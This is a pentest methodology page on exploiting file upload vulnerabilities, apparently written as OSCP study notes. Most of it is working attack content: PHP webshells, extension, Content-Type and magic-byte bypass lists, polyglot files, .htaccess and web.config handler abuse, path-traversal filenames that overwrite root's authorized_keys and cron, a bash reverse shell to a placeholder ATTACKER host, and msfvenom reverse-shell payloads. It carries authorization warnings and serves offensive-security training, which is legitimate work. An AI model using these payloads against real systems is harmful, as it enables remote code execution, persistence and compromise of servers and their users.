# File Upload Vulnerabilities

> Unrestricted file upload: the server accepts a file that can be executed
> (webshell, .htaccess, cron, authorized_keys) or served to other users.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. Exploitation](#4-exploitation)
- [5. Server-Specific Quirks](#5-server-specific-quirks)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. Tools](#7-tools)
- [8. OSCP Notes](#8-oscp-notes)
- [9. Cheatsheet](#9-cheatsheet)
- [10. References](#10-references)

---

## 1. Overview

File upload bypasses fall into layers:

| Layer | Bypass |
|-------|--------|
| Client-side JS | Intercept with Burp, change filename/extension |
| Content-Type check | Change multipart Content-Type header |
| Extension blacklist | Double ext, case, null byte, .htaccess |
| Extension whitelist | Race condition, polyglot, content-type abuse |
| Magic bytes / signature | Prepend magic bytes, polyglot |
| Filename sanitization | Path traversal, encoding |
| Execution disabled | .htaccess to re-enable, or target config upload |

**Impact:**

- Remote code execution (webshell).
- Overwrite sensitive files (SSH keys, cron, config).
- XSS via HTML/SVG upload.
- SSRF via crafted files (e.g., .gpx, .pdf).
- DoS (huge files, image bombs).

**On OSCP:** file upload appears often. Usually the goal is a webshell,
then privesc via SUID/sudo.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Upload a benign file (image, txt) | [PROD] |
| Upload a webshell / RCE payload | [PROD-NO] |
| Overwrite SSH keys / cron | [PROD-NO] |
| Large file / image bomb DoS | [PROD-NO] |
| Path traversal in filename to overwrite system files | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT upload a webshell without written approval.
- Do NOT overwrite files outside the upload directory.
- Do NOT upload huge files or zip bombs.
- Do NOT use the upload to attack other users (malicious SVG/HTML served to them).
- Clean up uploaded test files at the end of the engagement.

### 2.3 Rate limiting

File uploads are individual requests. Do not fuzz extensions at scale in
production (each attempt is logged, and a WAF may flag the pattern).

---

## 3. Detection

### 3.1 Where to look

- Profile picture, avatar, cover image.
- Document upload (CV, invoice, ticket attachment).
- Import feature (CSV, XML, JSON).
- Media / gallery upload.
- Backup restore features.
- Plugin / theme upload (WordPress, Joomla, Drupal).

### 3.2 What is allowed

Upload a benign file and inspect:

```bash
# Upload a simple image
curl -F 'file=@test.jpg' 'http://target/upload'
```

Check:

- Where does the file end up? (response URL, guess /uploads/name)
- Is it served with Content-Type: image/jpeg or application/octet-stream?
- Does the filename keep the extension?
- Is the extension lowercased / renamed (hash.jpg)?

---

## 4. Exploitation

### 4.1 Unrestricted upload

Upload shell directly:

```php
<?php system($_GET['c']); ?>
```

```bash
curl -F 'file=@shell.php' 'http://target/upload'
curl 'http://target/uploads/shell.php?c=id'
```

Other payload languages: .jsp, .aspx, .phtml, .php3/.php4/.php5/.php7, .phar.

### 4.2 Extension bypass (blacklist)

If .php is blocked, try:

```text
shell.php3        (old PHP)
shell.php4
shell.php5
shell.php7
shell.phtml       (often executes)
shell.phar
shell.pHp         (case)
shell.php.jpg     (double ext, works if misconfigured)
shell.php%00.jpg  (null byte - old PHP)
shell.php.        (trailing dot - Windows)
shell.php::  (Windows ADS)
shell.pHp5
```

### 4.3 Content-Type bypass

If the app checks Content-Type, change it in the multipart body:

```bash
curl -F 'file=@shell.php;type=image/jpeg' 'http://target/upload'
```

Or in Burp: change `Content-Type: application/x-php` to `image/jpeg`.

### 4.4 Magic bytes / signature

If the app checks the file signature, prepend valid magic bytes:

```text
JPEG:  FF D8 FF E0
PNG:   89 50 4E 47 0D 0A 1A 0A
GIF:   47 49 46 38 39 61   (GIF89a)
PDF:   25 50 44 46         (%PDF)
```

Example GIF+PHP polyglot:

```bash
printf 'GIF89a;' > shell.php
echo '<?php system($_GET['c']); ?>' >> shell.php
```

The file starts with GIF89a (accepted as GIF), but PHP still executes the
PHP block inside (if extension is .php).

### 4.5 Double extensions, null byte, case

```text
shell.jpg.php       (Windows: image, Apache: PHP if misconfigured)
shell.php.jpg       (bypass if app only checks last ext)
shell.php%00.jpg    (null byte, old PHP < 5.3.4)
shell.pHp           (case bypass)
shell.php.          (trailing dot, Windows strips it)
shell.php::    (Windows ADS)
shell.php%20        (trailing space)
shell.php%2e       (dot encoded)
```

### 4.6 .htaccess / web.config upload

If .htaccess can be uploaded, re-enable PHP on a benign extension:

```text
# .htaccess
AddType application/x-httpd-php .jpg
```

Then upload `shell.jpg` containing PHP code. Apache will execute it.

**IIS: web.config upload**

```xml
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Execute">
      <add name="php" path="*.jpg" verb="*" modules="FastCgiModule"
           scriptProcessor="C:\\PHP\\php-cgi.exe" resourceType="Either" />
    </handlers>
  </system.webServer>
</configuration>
```

### 4.7 Polyglot

A single file that is valid as multiple formats.

**GIF + PHP:**

```text
GIF89a; <?php system($_GET['c']); ?>
```

**ZIP + PHP** (for LFI with zip://):

```bash
# Create a ZIP containing shell.php
zip payload.zip shell.php
# Prepend GIF magic bytes
printf 'GIF89a;' | cat - payload.zip > payload.gif.zip
```

**PDF + PHP:**

```text
$PDF-1.4
<?php system($_GET['c']); ?>
...
```

### 4.8 Path traversal in filename

If the app keeps the original filename, try to escape the upload directory:

```bash
curl -F 'file=@shell.php;filename=../../../var/www/html/shell.php' 'http://target/upload'
curl -F 'file=@shell.php;filename=..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php' 'http://target/upload'
```

**Overwrite sensitive files:**

```text
../../../../root/.ssh/authorized_keys
../../../../etc/cron.d/backdoor
../../../../var/spool/cron/crontabs/root
../../../../home/user/.bashrc
```

If you can write to authorized_keys, upload your public key:

```bash
ssh-keygen -t rsa -f ./id_rsa
curl -F 'file=@id_rsa.pub;filename=../../../root/.ssh/authorized_keys' 'http://target/upload'
ssh -i id_rsa root@target
```

### 4.9 Client-side validation bypass

If validation happens only in JS:

1. Disable JS in browser, or
2. Use Burp to intercept the POST and change the filename / content, or
3. Upload via curl (no JS involved).

```bash
curl -F 'file=@shell.php' 'http://target/upload'
```

---

## 5. Server-Specific Quirks

### Apache

- `.htaccess` upload can enable PHP on any extension.
- `mod_mime` misconfig can execute `.jpg` as PHP.
- Multi-extension: `file.php.jpg` may execute depending on `AddHandler`.

### Nginx

- Does not read `.htaccess`. Need PHP-FPM config abuse.
- `fastcgi_split_path_info` misconfig can execute `file.jpg/x.php`.

### IIS

- `web.config` upload for handler abuse.
- `;` in filename: `shell.asp;.jpg` (old IIS).
- `::` (ADS): `shell.asp::`.
- Shortname disclosure (`SHELL~1.ASP`).

### Tomcat / Java

- `.jsp`, `.jspx`, `.jsw`, `.jsv` - all executable.
- `.war` upload via manager = full deploy.

---

## 6. Post-Exploitation

### 6.1 Reverse shell from webshell

```php
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"); ?>
```

Or the classic one-liner:

```bash
nc -lvnp 4444
# then trigger: ?c=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

### 6.2 Common webshells

- `weevely` (PHP, encrypted)
- `p0wny-shell` (interactive PHP)
- `simple php reverse shell` (pentestmonkey)
- `msfvenom -p php/reverse_php LHOST=... LPORT=...`

---

## 7. Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept upload, modify filename / Content-Type |
| weevely | Generate and interact with PHP webshell |
| msfvenom | Generate payloads (php, jsp, war, aspx) |
| p0wny-shell | Interactive single-file PHP shell |
| exiftool | Embed payload in image metadata |

Examples:

```bash
# weevely
weevely generate password shell.php
weevely http://target/uploads/shell.php password

# msfvenom PHP
msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw > shell.php

# msfvenom WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war > shell.war
```

---

## 8. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the upload request (filename, Content-Type).
> - Screenshot the upload directory listing or URL access.
> - Screenshot the webshell execution (id output).
> - Screenshot the reverse shell.
>
> File upload alone is not enough. Show that the upload leads to code
> execution or to a sensitive file write (SSH key, cron).
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 9. Cheatsheet

```bash
# Basic upload
curl -F 'file=@shell.php' 'http://target/upload'

# Bypass Content-Type
curl -F 'file=@shell.php;type=image/jpeg' 'http://target/upload'

# Bypass filename
curl -F 'file=@shell.php;filename=shell.php.jpg' 'http://target/upload'
curl -F 'file=@shell.php;filename=shell.phtml' 'http://target/upload'

# Path traversal
curl -F 'file=@shell.php;filename=../../../var/www/html/shell.php' 'http://target/upload'

# GIF + PHP polyglot
printf 'GIF89a;' > shell.php
echo '<?php system($_GET['c']); ?>' >> shell.php
```

```text
Extension bypass list: .phtml .php3 .php4 .php5 .php7 .phar .pHp .php. .php%00.jpg .php::
Magic bytes: JPEG=FFD8FFE0  PNG=89504E47  GIF=47494638 (GIF89a)  PDF=25504446 (%PDF)
```

---

## 10. References

- OWASP File Upload Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- PortSwigger file upload - https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings File Upload - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- p0wny-shell - https://github.com/flozz/p0wny-shell
- weevely - https://github.com/epinna/weevely3

> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [LFI-RFI.md](./LFI-RFI.md), [Command-Injection.md](./Command-Injection.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
